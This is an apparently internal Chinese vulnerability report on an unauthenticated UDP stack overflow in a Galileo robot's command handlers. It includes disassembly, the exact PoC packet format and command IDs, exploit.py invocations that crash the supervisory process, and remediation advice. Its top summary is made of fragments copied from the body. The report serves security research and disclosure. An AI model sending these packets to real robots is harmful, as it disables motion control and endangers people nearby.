---
编号: GAL-006
验证状态: 静态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: UDP10086命令处理栈溢出-1
---
# GAL-006 伽利略（Galileo）机器人 UDP 10086 命令处理函数栈溢出 漏洞报告

## 1. 一句话结论

- \| 漏洞类型 \| 远程栈缓冲区溢出（内存破坏；当前现实影响=未授权远程崩溃监控主进程） \|
- \| 权限 \| 任意可达 UDP 10086 的主机（未授权） \|
- ## 1. 漏洞概述
- （RobotStatus@0x6C77C 只回 169 字节堆/全局数据）。**RCE 需要独立的泄露原语**。
- ## 2. 我方独立复核证据（与外部审计结论一致）

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）GRQ05W（固件 galileo-inter 1.0.44） \|
- \| 漏洞组件 \| `libNetworkSdk.so`（monitor_manager 常驻加载） \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|

## 3. 验证状态

`静态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- memcpy(SP+0x34, payload, len)   ← len 可达 1024 → 越界 1020 字节
- 帧 0xA0；dest @ SP+0x48；canary @ SP+0x98 → 越界 1008 字节
- 无认证、无来源过滤——单个 UDP 包即触发 `__stack_chk_fail` 使
- python exploit.py probe --len 5             # 最小越界(仅毁金丝雀)

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- \| 漏洞类型 \| 远程栈缓冲区溢出（内存破坏；当前现实影响=未授权远程崩溃监控主进程） \|
- `orrt_monitor_manager_main`（机器人监管控制主进程）崩溃。
- ③ 调用链 ProcessData 亦带金丝雀；④ 本 socket 无栈泄露通道
- （RobotStatus@0x6C77C 只回 169 字节堆/全局数据）。**RCE 需要独立的泄露原语**。
- 受影响 cmd: 0x31010C01(SetControlMode) 0x31010500(SetPolicyMode)
- ## 5. 影响范围

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 UDP 10086 命令处理函数栈溢出 漏洞报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）GRQ05W（固件 galileo-inter 1.0.44） |
| 漏洞组件 | `libNetworkSdk.so`（monitor_manager 常驻加载） |
| 漏洞类型 | 远程栈缓冲区溢出（内存破坏；当前现实影响=未授权远程崩溃监控主进程） |
| 定位 | `RobotSetControlMode@0x6C338` / `RobotSetPolicyMode@0x6C184` / `RobotTurnLeftAndRight@0x6BDF4` / `RobotTransLeftAndRight@0x6BD74` / `RobotTransBackAndForth@0x6BCF4`；分发于 `ProcessData@0x6A39C` |
| 权限 | 任意可达 UDP 10086 的主机（未授权） |
| 复现日期 | 2026-08-29（发现方：外部审计包 `AUD-udp-cmdhandler-stack-smash`；本报告经我方用自有反汇编独立复核确认） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

`ProcessData` 对 type=1 包只校验 `1 ≤ length ≤ 0x400`，随后 `handler(payload, length)`
把 **攻击者长度原样传给命令处理函数**。五个处理函数把该长度直接用作 `memcpy` 尺寸，
拷入 **4 字节或 16 字节的栈局部变量**：

```
RobotTransBackAndForth/TurnLeftAndRight/TransLeftAndRight（4 字节目标）:
  帧 0x40；dest @ SP+0x34；canary @ SP+0x38（dest+4 即金丝雀）
  memcpy(SP+0x34, payload, len)   ← len 可达 1024 → 越界 1020 字节

RobotSetControlMode/RobotSetPolicyMode（16 字节目标）:
  帧 0xA0；dest @ SP+0x48；canary @ SP+0x98 → 越界 1008 字节
```

无认证、无来源过滤——单个 UDP 包即触发 `__stack_chk_fail` 使
`orrt_monitor_manager_main`（机器人监管控制主进程）崩溃。

**诚实边界（外部复审+我方认同）**：当前为"崩溃级"原语——
① 处理函数自身 epilogue 的金丝雀检查先于被覆盖返回地址生效；
② 该函数保存的 X30 位于 dest 下方（向上拷贝覆盖不到）；
③ 调用链 ProcessData 亦带金丝雀；④ 本 socket 无栈泄露通道
（RobotStatus@0x6C77C 只回 169 字节堆/全局数据）。**RCE 需要独立的泄露原语**。

## 2. 我方独立复核证据（与外部审计结论一致）

自有反汇编（`analysis/` 下 walk_dis 输出，RobotTransBackAndForth @0x6BCF4）：

```
0x6bcf4: stp x29,x30,[sp,#-0x40]!        ; 帧 0x40
0x6bd0c: ldr x0,[x0]; 0x6bd14: str x1,[sp,#0x38]   ; 金丝雀存 SP+0x38
0x6bd1c: str wzr,[sp,#0x34]              ; dest=0（4字节）@ SP+0x34
0x6bd20: ldr w1,[sp,#0x24]               ; len ← 处理函数第2参（攻击者 u32）
0x6bd24: add x0,sp,#0x34                 ; dst
0x6bd2c: ldr x1,[sp,#0x28]               ; src ← payload
0x6bd30: bl  memcpy                      ; memcpy(SP+0x34, payload, len≤0x400)
```

ProcessData 长度边界（自有 processdata_dis.txt）：

```
0x6a560: cmp w0,#0x400; b.hi 拒绝       ; 仅上限 0x400
0x6a574: b.ne 0x6a608                    ; length≠0 进入数据体路径
0x6a788-0x6a7ac: type==1 → handler(payload, length)
```

## 3. PoC 包格式

```
u32 0x55AA55AA | u32 cmd | u32 length=0x400 | u32 type=1 | 1024字节payload
受影响 cmd: 0x31010C01(SetControlMode) 0x31010500(SetPolicyMode)
           0x31010145(Turn) 0x31010141(TransLR) 0x31010140(TransBF)
观察: 机器人日志出现 __stack_chk_fail / monitor_manager 进程消失并自动重启
```

## 4. 复现（adb 桥接版见 exploit.py）

```bash
python exploit.py smash --cmd turn          # 1024字节'A' → 崩溃 Turn 处理器
python exploit.py smash --cmd takeover16    # 16字节目标变体(SetControlMode)
python exploit.py probe --len 5             # 最小越界(仅毁金丝雀)
```

## 5. 影响范围

- 未授权远程崩溃机器人监管控制主进程（运动控制/监控/网络遥控全部随之下线）——
  可反复触发 = 持续 DoS（物理安全：运行中机器人失控停车逻辑依赖该进程）；
- 内存破坏原语等级：RCE-grade（获得任意泄露通道后即可升级代码执行）。

## 6. 修复建议

1. 处理函数对长度做与目标尺寸一致的上限检查（这些命令参数均 ≤16 字节，直接
   `if (len != 4/16) return;`）；
2. `ProcessData` 分发前按命令白名单校验 length 合法范围；
3. 换 `memcpy` 为定长拷贝或 `std::span`；配合栈金丝雀之外的 CFU/PIE 缓解。

## 7. 证据

- `evidence/processdata_dis.txt`：分发与长度检查（自有反汇编全文副本）
- `evidence/handler_disassembly.txt`：五个处理函数反汇编（含栈布局标注）
- 外部审计原文：`AUD-udp-cmdhandler-stack-smash.md`（含其复审记录）
